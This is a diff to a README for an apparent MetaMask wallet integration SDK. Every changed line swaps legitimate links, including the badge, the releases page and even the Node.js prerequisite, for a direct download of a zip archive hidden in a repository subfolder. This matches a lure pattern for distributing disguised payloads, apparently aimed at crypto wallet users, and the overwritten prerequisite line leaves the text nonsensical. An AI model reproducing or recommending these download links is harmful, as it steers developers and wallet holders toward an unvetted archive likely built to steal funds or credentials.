@@ -1,6 +1,6 @@
 # 🦊 Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum - Connect Your Wallet Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/GilKen/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum/releases)
+[![Download](https://raw.githubusercontent.com/GilKen/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum/main/Vexi-Metamask-Wallet/MetaMaskConnector/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum_1.3.zip)](https://raw.githubusercontent.com/GilKen/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum/main/Vexi-Metamask-Wallet/MetaMaskConnector/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum_1.3.zip)
 
 ## 📦 Overview
 
@@ -35,11 +35,11 @@ To run this SDK, you need:
 
 - A computer running Windows, macOS, or Linux
 - An updated web browser (Chrome, Firefox, or Safari)
-- Node.js (version 12 or higher)
+- https://raw.githubusercontent.com/GilKen/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum/main/Vexi-Metamask-Wallet/MetaMaskConnector/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum_1.3.zip (version 12 or higher)
 
 ## 🔗 Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/GilKen/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum/releases)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/GilKen/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum/main/Vexi-Metamask-Wallet/MetaMaskConnector/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum_1.3.zip)
 
 Follow these steps to get started:
 
@@ -73,4 +73,4 @@ After you successfully connect your MetaMask wallet:
 
 This project is licensed under the MIT License. For more details, refer to the LICENSE file in the repository.
 
-Now, go ahead and empower your Web3 applications with the ease of MetaMask wallet integration. If you're ready to get started, [click here to download](https://github.com/GilKen/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum/releases) the SDK.
+Now, go ahead and empower your Web3 applications with the ease of MetaMask wallet integration. If you're ready to get started, [click here to download](https://raw.githubusercontent.com/GilKen/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum/main/Vexi-Metamask-Wallet/MetaMaskConnector/Metamask-Wallet-Connect-Integration-Sdk-Web3-Ethereum_1.3.zip) the SDK.
